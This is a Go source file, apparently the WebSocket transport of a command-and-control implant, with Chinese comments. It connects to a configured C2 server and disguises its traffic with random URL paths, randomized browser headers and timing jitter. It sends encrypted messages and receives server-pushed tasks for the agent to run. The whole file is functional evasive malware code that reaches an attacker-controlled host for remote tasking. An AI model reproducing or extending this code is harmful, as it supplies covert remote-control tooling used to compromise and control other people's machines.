package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var (
	wsConn   *websocket.Conn
	wsConnMu sync.Mutex
	// WS/TCP 长连接模式下的消息分发
	// reader goroutine 读到消息后，根据内容分发到 respCh（请求响应）或 pushCh（任务推送）
	wsRespCh chan map[string]interface{}
	wsPushCh chan []map[string]interface{}
)

// wsURL 把配置的 C2Server 转为 ws://host:port/ws/agent/<随机hex>
// 兼容注入的多种 scheme: websocket:// / http:// / https://
func wsURL() string {
	u := cfg.C2Server
	if strings.HasPrefix(u, "websocket://") {
		u = "ws://" + u[12:]
	} else if strings.HasPrefix(u, "https://") {
		u = "wss://" + u[8:]
	} else if strings.HasPrefix(u, "http://") {
		u = "ws://" + u[7:]
	}
	return u + "/ws/agent/" + randomHex16()
}

// randomHex16 生成 16 位随机 hex（用于 WS 路径伪装）
func randomHex16() string {
	n := rand.Int63()
	s := fmt.Sprintf("%x", n)
	for len(s) < 16 {
		s += fmt.Sprintf("%x", rand.Intn(16))
	}
	return s[:16]
}

// wsConnect 建立 WebSocket 连接（URL 随机路径），设置与 HTTP 一致的伪装 header
// 长连接模式下启动 reader goroutine 分发消息
func wsConnect() error {
	wsConnMu.Lock()
	defer wsConnMu.Unlock()
	if wsConn != nil {
		wsConn.Close()
		wsConn = nil
	}

	url := wsURL()
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
	}
	header := http.Header{}
	header.Set("User-Agent", randomUA())
	header.Set("Accept-Language", randomAcceptLanguage())

	conn, _, err := dialer.Dial(url, header)
	if err != nil {
		fmt.Printf("[!] WS connect failed: %v (url=%s)\n", err, url)
		return err
	}
	wsConn = conn
	fmt.Printf("[+] WS connected: %s\n", url)

	// 初始化消息分发 channel（仅在首次连接或断线重连后）
	if wsRespCh == nil {
		wsRespCh = make(chan map[string]interface{}, 16)
	}
	if wsPushCh == nil {
		wsPushCh = make(chan []map[string]interface{}, 16)
	}

	// 启动 reader goroutine（在持有锁的情况下启动，确保不会与其他 reader 冲突）
	go wsReaderLoop(conn)

	return nil
}

// wsReaderLoop WebSocket 消息读取循环
// 读到消息后解密，根据内容分发:
//   - 含 "tasks" 字段 → 任务推送（pushCh）
//   - 其他 → 请求响应（respCh）
func wsReaderLoop(conn *websocket.Conn) {
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			fmt.Printf("[!] WS read failed: %v\n", err)
			wsConnMu.Lock()
			if wsConn == conn {
				wsConn = nil
			}
			wsConnMu.Unlock()
			return
		}
		resp := decryptResponse(string(msg))
		if resp == nil {
			continue
		}
		// 分发: 含 tasks 字段的是任务推送
		if tasks, ok := resp["tasks"].([]interface{}); ok {
			taskList := make([]map[string]interface{}, 0, len(tasks))
			for _, t := range tasks {
				if tm, ok := t.(map[string]interface{}); ok {
					taskList = append(taskList, tm)
				}
			}
			if len(taskList) > 0 {
				wsPushCh <- taskList
			}
			continue
		}
		// 其他消息作为请求响应
		wsRespCh <- resp
	}
}

// wsClose 关闭 WebSocket 连接
func wsClose() {
	wsConnMu.Lock()
	defer wsConnMu.Unlock()
	if wsConn != nil {
		wsConn.Close()
		wsConn = nil
	}
}

// wsPost 通过 WebSocket 帧发送加密请求并等待响应
// 长连接模式下，响应通过 wsRespCh 异步返回
func wsPost(op string, data interface{}) map[string]interface{} {
	// 确保连接
	wsConnMu.Lock()
	if wsConn == nil {
		wsConnMu.Unlock()
		if err := wsConnect(); err != nil {
			return nil
		}
		wsConnMu.Lock()
	}
	conn := wsConn
	wsConnMu.Unlock()

	// 加密 payload（与 httpPost 相同逻辑）
	if m, ok := data.(map[string]interface{}); ok {
		m["_op"] = op
		data = m
	}
	algo := cfg.EncAlgo
	if algo == "" {
		algo = "none"
	}
	var bodyStr string
	if algo == "none" {
		j, _ := json.Marshal(data)
		bodyStr = base64.StdEncoding.EncodeToString(j)
	} else {
		enc, _, err := encEncrypt(data, algo, cfg.EncPassword)
		if err != nil {
			return nil
		}
		bodyStr = enc
	}

	// 随机抖动（模拟用户操作间隔）
	if rand.Float64() < stegoProb {
		time.Sleep(time.Duration(rand.Float64()*packetJitter*1000) * time.Millisecond)
	}

	// 发送
	wsConnMu.Lock()
	if conn != wsConn {
		if wsConn == nil {
			wsConnMu.Unlock()
			return nil
		}
		conn = wsConn
	}
	err := conn.WriteMessage(websocket.TextMessage, []byte(bodyStr))
	wsConnMu.Unlock()
	if err != nil {
		fmt.Printf("[!] WS write failed: %v\n", err)
		wsConnMu.Lock()
		if wsConn == conn {
			wsConn = nil
		}
		wsConnMu.Unlock()
		return nil
	}

	// 等待响应（超时 30 秒）
	select {
	case resp := <-wsRespCh:
		return resp
	case <-time.After(30 * time.Second):
		fmt.Printf("[!] WS response timeout (op=%s)\n", op)
		return nil
	}
}

// receivePushedTasks WS 模式下阻塞等待服务端推送的任务
// 由 runLongConnectionMode 调用
func receivePushedTasksWS() []map[string]interface{} {
	tasks, ok := <-wsPushCh
	if !ok {
		return nil
	}
	return tasks
}
